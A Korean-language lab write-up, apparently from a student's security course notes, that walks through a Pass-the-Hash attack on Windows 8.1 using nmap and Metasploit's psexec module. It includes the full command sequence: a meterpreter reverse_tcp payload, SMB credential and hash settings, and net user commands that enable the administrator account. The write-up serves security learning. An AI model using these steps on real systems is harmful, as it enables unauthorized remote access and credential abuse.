# Window 8.1에서 Pass the hash 공격

## 네트워크 동작확인 1
처음으로 우리가 할일은 Kali와 Window 8.1가 연결되어있는지 확인하는 것이다.
이는 아래의 사진과 같이 연결 확인이 가능하다.
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/Pass%20the%20Hash/Window%208.1/Kali%2C%20Win8.1%20%EC%97%B0%EA%B2%B0%ED%99%95%EC%9D%B8.png)

또는 이것이 안되는 경우 다음의 사진을 참고하여 설정을 한다.

![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/Pass%20the%20Hash/Window%208.1/WIndow%208.1%20%EC%84%A4%EC%A0%95.png)

## 네트워크 동작확인 2
원격접속에 필요한 포트들이 열렸는지 확인하기 위해 다음과 같은 방법을 통해 확인한다.

**nmap (Window8.1의 IP)**

![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/Pass%20the%20Hash/Window%208.1/Kali%EC%97%90%EC%84%9C%20Window%208.1%EC%9D%98%20portscan.png)

우리는 위 사진을 통해 원격접속에 필요한 포트들이 모두 열려있음을 알 수 있다.

## NMAP?
NMAP은 port Scanning 툴로써 Host나 Network를 Scanning할 때 아주 유용한 시스템 보안툴인과 동시에, 해커에게 강력한 해킹툴로서 사용할 수 있는 도구이다.
NMAP은 기존의 Port ScanningTool에 비해 다양한 옵션과 방화벽 안쪽의 네트워크도 스캔할 수 있는 강력한 기능이 있다.
</br>

## Window 8.1에서 Window Xp에서 수집한 Password를 통해 Pass the Hash해보기

**msfconsole 을 Kali의 명령창에 입력한다.**

이후 우리는 PsExec(module)을 통해 Pass the Hash를 할 것이다.

**Search psexec**

**use exploit/windows/smb/psexec**

![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/Pass%20the%20Hash/Window%208.1/Window%208.1%20PasstheHash%201.png)

**set payload windows/x64/meterpreter/reverse_tcp**

**show options**

**set RHOST (Window8.1의 IP)**

**set LHOST (Kali의 IP)**

**set smbuser administrator**

**set smbpass 500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0**

![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/Pass%20the%20Hash/Window%208.1/Window%208.1%20PasstheHash%202.png)

**run**

![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/Pass%20the%20Hash/Window%208.1/Window%208.1%20PasstheHash%202.png)

## 하지만 사진에서 보다싶이 공격은 실패한다.
이유는 아직 window 8.1에 관리자의 계정을 활성화 시키지 않기에 이러한 사태가 벌어진다.
따라서 다음과 같이 window 8.1의 관리자의 계정을 활성화하고 비밀번호는 자신이 생각한 비밀번호로 변경한다.

![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/Pass%20the%20Hash/Window%208.1/Window%208.1%20%EA%B4%80%EB%A6%AC%EC%9E%90%20%EC%84%A4%EC%A0%95.png)

위의 그림과 같이 다음 아래의 명령어를 순차적으로 입력한다.

**net user administrator P$sw0rdY**

**net user administrator /active:yes**

그다음 제어판에서 관리자의 비밀번호를 원하는 비밀번호로 설정한다.
원하는 비밀번호를 설정했다면 아래의 명령어를 다시 실행을 시켜 진행해본다.

**set smbuser administrator**

**set smbpass (변경한 비밀번호: 필자는 arad4228)**

![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/Pass%20the%20Hash/Window%208.1/%EA%B3%B5%EA%B2%A9.png)

그렇다면 다음과 같은 결과를 얻을 수 있다.

![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/Pass%20the%20Hash/Window%208.1/%EA%B3%B5%EA%B2%A9%20%EC%84%B1%EA%B3%B5.png)

위의 사진과 같이 방화벽이 켜져있다면 방화벽에서 해당 공격에 대해 알리고 공격을 멈추게 하며 방화벽이 켜져있지않다면 접속이 됨을 짐작할 수 있다.

### 이를 통한 배운점은?
우리는 MS08-067을 통해  windowXp의 Password Hash를 구할 수  있게 되었다.
앞에서 이야기한것과 같은 방식으로 raindow hash table을 통해 직접 Password를 얻을 수도 있지만 해당 방법과 같이 Hash값을 통해 직접 로그인하는 결과를 얻을 수 있다.
따라서 이러한 공격에 대한 방어 메커니즘이 필요한것을 느낄 수 있고 이러한 방법으로 취약점을 분석할 수 있다는 것을 느낄 수 있는 실습이었다.
</br>
